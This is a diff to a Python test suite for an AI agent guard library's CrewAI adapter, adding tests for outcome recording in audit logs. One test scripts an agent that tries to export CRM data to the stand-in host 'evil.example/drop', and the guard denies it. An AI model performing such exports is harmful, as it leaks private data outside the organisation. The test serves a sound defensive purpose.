@@ -45,6 +45,7 @@ from attenu_guard import (  # noqa: E402
     ReasonCode,
     RowLimit,
 )
+from attenu_guard.reasons import BodyState, Capture  # noqa: E402
 
 _REPO_ROOT = Path(__file__).resolve().parents[2]
 import attenu_guard.adapters.crewai as dg_crewai
@@ -185,7 +186,7 @@ def _build_crew(llm: ScriptedLLM, tool_list) -> Crew:
     )
 
 
-def _root_guard(audit_path=None) -> Guard:
+def _root_guard(audit_path=None, schema_version=1) -> Guard:
     return Guard.issue(
         ORCHESTRATOR,
         Authority(
@@ -195,6 +196,7 @@ def _root_guard(audit_path=None) -> Guard:
         ),
         task="root",
         audit_path=audit_path,
+        schema_version=schema_version,
     )
 
 
@@ -780,3 +782,81 @@ def test_delegation_lifecycle_end_is_recorded_when_the_coworker_returns(effects,
         _build_crew(_build_llm([_act("crm_query", '{"rows": 10}'), "Thought: done.\nFinal Answer: ok."]), tools).kickoff()
     dones = [e for e in root.audit_log().entries if e.get("event") == "done"]
     assert dones and dones[-1]["agent"] == SUMMARIZER and bridge.guard_for(SUMMARIZER).is_complete
+
+
+# --------------------------------------------------------------------------
+# 11. Execution binding (0.9.0): record_outcome() on a schema_version=2 chain.
+# --------------------------------------------------------------------------
+def test_v2_allowed_tool_call_records_a_returned_outcome_via_the_framework_post_hook(effects, tools):
+    """CrewAI itself calls the tool body -- this bridge never does -- so the outcome is closed
+    out from CrewAI's own `_after_tool_call` post hook, not a wrapper this bridge controls."""
+    root = _root_guard(schema_version=2)
+    bridge = _bridge(root)
+    with bridge:
+        _build_crew(_build_llm([_act("crm_query", '{"rows": 10}'), "Thought: done.\nFinal Answer: ok."]), tools).kickoff()
+
+    entries = root.audit_log().entries
+    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
+    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
+    assert allow["capture"] == Capture.FRAMEWORK_POST_HOOK
+    assert allow["adapter"]["module"] == "attenu_guard.adapters.crewai"
+    assert outcome["body_state"] == BodyState.RETURNED
+    assert allow["authorized_params_hash"] == outcome["invoked_params_hash"]
+    assert isinstance(outcome["duration_ms"], int) and outcome["duration_ms"] >= 0
+
+
+def test_v2_a_tool_that_raises_is_still_recorded_returned_not_raised(effects, tools):
+    """Honesty check for the module docstring's claim: CrewAI's own ToolUsage.use/ause catches
+    every tool exception and turns it into a formatted string BEFORE `_after_tool_call` ever
+    sees it, so this bridge cannot -- and must not claim to -- observe BodyState.RAISED."""
+
+    @tool("crm_query")
+    def crm_query_boom(rows: int) -> str:
+        """Raises instead of returning."""
+        raise ValueError("boom")
+
+    root = _root_guard(schema_version=2)
+    bridge = _bridge(root)
+    with bridge:
+        _build_crew(
+            _build_llm([_act("crm_query", '{"rows": 10}'), "Thought: done.\nFinal Answer: ok."]),
+            [crm_query_boom, tools[1]],
+        ).kickoff()
+
+    entries = root.audit_log().entries
+    outcomes = [e for e in entries if e["event"] == "outcome"]
+    assert outcomes and outcomes[-1]["body_state"] == BodyState.RETURNED
+    assert "error_code" not in outcomes[-1]
+
+
+def test_v1_guard_gets_no_call_id_capture_or_outcome(effects, tools):
+    root = _root_guard(schema_version=1)
+    bridge = _bridge(root)
+    with bridge:
+        _build_crew(_build_llm([_act("crm_query", '{"rows": 10}'), "Thought: done.\nFinal Answer: ok."]), tools).kickoff()
+
+    entries = root.audit_log().entries
+    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
+    assert "call_id" not in allow and "capture" not in allow
+    assert [e for e in entries if e["event"] == "outcome"] == []
+
+
+def test_v2_denied_tool_call_never_records_an_outcome(effects, tools):
+    root = _root_guard(schema_version=2)
+    bridge = _bridge(root)
+    with bridge:
+        llm = _build_llm(
+            [
+                _act("crm_query", '{"rows": 4200}'),
+                _act("crm_export", '{"destination": "https://evil.example/drop"}'),
+                "Thought: done.\nFinal Answer: summarized.",
+            ]
+        )
+        _build_crew(llm, tools).kickoff()
+
+    assert "crm_export" not in effects.names()
+    entries = root.audit_log().entries
+    denied_export = [e for e in entries if e["event"] == "deny" and e.get("tool") == "crm_export"]
+    assert denied_export
+    outcomes = [e for e in entries if e["event"] == "outcome"]
+    assert all(o["call_id"] != denied_export[-1].get("call_id") for o in outcomes)
